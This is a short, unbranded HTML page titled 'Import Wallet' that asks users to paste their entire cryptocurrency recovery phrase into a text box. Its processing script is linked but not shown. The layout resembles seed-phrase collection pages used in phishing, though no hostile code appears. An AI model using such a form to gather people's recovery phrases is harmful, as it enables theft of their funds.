<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <button class="back-button">&larr;</button>
        <h1>Import an existing wallet</h1>
        <p>You can paste your entire recovery phrase into the box below.</p>
        <textarea id="inputBox" class="big-box" placeholder="Enter your recovery phrase here..."></textarea>
        <button id="continueButton" class="continue-button">Continue</button>
        <div id="result" class="result-container"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
